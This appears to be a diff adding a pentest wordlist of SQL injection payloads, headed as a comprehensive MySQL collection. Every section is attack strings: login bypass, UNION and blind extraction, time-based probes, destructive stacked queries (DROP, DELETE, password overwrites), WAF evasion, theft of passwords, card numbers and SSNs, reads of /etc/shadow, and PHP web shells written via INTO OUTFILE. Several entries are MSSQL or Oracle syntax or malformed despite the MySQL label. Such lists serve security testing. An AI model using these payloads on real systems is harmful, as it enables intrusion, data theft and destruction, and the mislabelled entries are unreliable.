@@ -1,0 +1,247 @@
+# MySQL Injection Payloads - Comprehensive Collection
+# Version: 1.0.17-20260301-Minggu-1738-WIB
+# Category: Database Injection - MySQL
+
+# ============================================
+# BASIC AUTH BYPASS
+# ============================================
+
+admin' --
+admin' #
+admin'/*
+admin'@
+admin'-
+admin' '
+admin'/
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+
+# Double encoding bypass
+admin%27%20--
+admin%2527%2520--
+
+# Case variations
+Admin' --
+ADMIN' --
+aDmIn' --
+
+# ============================================
+# UNION-BASED INJECTION
+# ============================================
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT username,password FROM users--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT username,password,email,role FROM admin--
+
+# With comments
+' UNION/**/SELECT/**/NULL--
+' UNION/**/SELECT/**/NULL,NULL--
+
+# ============================================
+# ERROR-BASED INJECTION
+# ============================================
+
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--
+' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT table_name from information_schema.tables limit 1),floor(rand(0)*2))x from information_schema.tables group by x)a)--
+' AND (SELECT count(*) FROM (SELECT 1 union select 2 union select 3)x)>=0--
+
+# ============================================
+# BLIND SQL INJECTION
+# ============================================
+
+' AND 1=1--
+' AND 1=2--
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
+' AND ASCII(SUBSTRING((SELECT database()),1,1))>50--
+' AND SLEEP(5)--
+' AND BENCHMARK(5000000,MD5('A'))--
+
+# Boolean-based blind
+' AND 1=1#
+' AND EXISTS(SELECT * FROM users)#
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0#
+
+# ============================================
+# TIME-BASED INJECTION
+# ============================================
+
+' AND SLEEP(5)#
+' AND SLEEP(5)--
+' AND BENCHMARK(1000000,MD5('test'))#
+' AND (SELECT * FROM (SELECT SLEEP(5))A)#
+' WAITFOR DELAY '00:00:05'--
+'; WAITFOR DELAY '00:00:05'--
+
+# ============================================
+# STACKED QUERIES
+# ============================================
+
+'; DROP TABLE users;--
+'; DROP DATABASE database_name;--
+'; INSERT INTO users (username,password) VALUES ('hacker','password');--
+'; UPDATE users SET role='admin' WHERE username='admin';--
+'; DELETE FROM users WHERE 1=1;--
+'; CREATE TABLE backdoor (cmd text);--
+'; EXEC xp_cmdshell('dir');--
+
+# ============================================
+# BYPASSING WAF
+# ============================================
+
+/**/UNION/**/SELECT/**/
+/*!UNION*/ /*!SELECT*/
+UNION/**/SELECT/**/NULL
+%55NION%20SELECT%20NULL
+%27%55NION%20%53ELECT%20NULL--
+0x555N494F4E2053454C454354
+
+# Inline comments
+UN/**/ION SE/**/LECT NULL
+UN/*!50000UNION*/ /*!50000SELECT*/
+
+# Tabs and newlines
+'	UNION	SELECT	NULL--
+'
+UNION SELECT
+NULL--
+
+# ============================================
+# INFORMATION_SCHEMA ENUMERATION
+# ============================================
+
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE'--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='admin'--
+' UNION SELECT schema_name FROM information_schema.schemata--
+
+# ============================================
+# DATA EXFILTRATION
+# ============================================
+
+' UNION SELECT username,password FROM users--
+' UNION SELECT username,password,email FROM admin--
+' UNION SELECT credit_card_number FROM payments--
+' UNION SELECT first_name,last_name,ssn FROM customers--
+
+# ============================================
+# ORDER BY / GROUP BY INJECTION
+# ============================================
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+' ORDER BY 6--
+' ORDER BY 7--
+' ORDER BY 8--
+' ORDER BY 9--
+' ORDER BY 10--
+' GROUP BY 1--
+' GROUP BY 2,3,4--
+' HAVING 1=1--
+
+# ============================================
+# LIKE INJECTION
+# ============================================
+
+' LIKE '%a%'
+' LIKE '%admin%'
+' LIKE '%pass%'
+' OR username LIKE '%admin%'--
+' OR password LIKE '%'--
+
+# ============================================
+# INSERT/UPDATE/DELETE INJECTION
+# ============================================
+
+'; INSERT INTO users (username,password) VALUES ('test','test');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM users WHERE username='test';--
+
+# ============================================
+# OUTFILE/DUMPFILE
+# ============================================
+
+' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
+' UNION SELECT '<?php eval($_POST["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php'--
+
+# ============================================
+# LOAD FILE
+# ============================================
+
+' UNION LOAD FILE('/etc/passwd')--
+' UNION LOAD FILE('/etc/shadow')--
+' UNION LOAD FILE('C:/Windows/win.ini')--
+' UNION SELECT LOAD_FILE('/var/www/html/config.php')--
+
+# ============================================
+# VERSION-SPECIFIC BYPASS
+# ============================================
+
+# MySQL 5+
+' UNION SELECT table_name FROM information_schema.tables--
+
+# MySQL 4
+' UNION SELECT host,user FROM mysql.user--
+
+# ============================================
+# LOGICAL OPERATORS
+# ============================================
+
+' AND '1'='1
+' OR '1'='1
+' AND NOT NULL IS NULL--
+' AND NOT NULL IS NOT NULL--
+
+# ============================================
+# COMMENT OBFUSCATION
+# ============================================
+
+admin'-- 
+admin'# 
+admin'/* 
+admin'// 
+admin'-
+admin'+
+admin'=
+admin'@
+admin'(
+admin')
+
+# ============================================
+# STORED PROCEDURES
+# ============================================
+
+'; EXEC sp_executesql N'SELECT * FROM users';--
+'; EXEC xp_cmdshell 'dir';--
+'; DECLARE @sql NVARCHAR(4000); SET @sql=(SELECT DB_NAME()); EXEC(@sql);--
+
+# ============================================
+# ADVANCED TECHNIQUES
+# ============================================
+
+# Second-order injection
+' ; EXECUTE IMMEDIATE 'UPDATE users SET password=''hacked'' WHERE username=''admin'''
+
+# Lateral injection
+' INTO OUTFILE '/var/www/html/backdoor.php' LINES TERMINATED BY '<?php system($_GET["c"]); ?>'
+
+# Multi-layer injection
+' UNION SELECT (SELECT @@version),NULL,NULL--
+
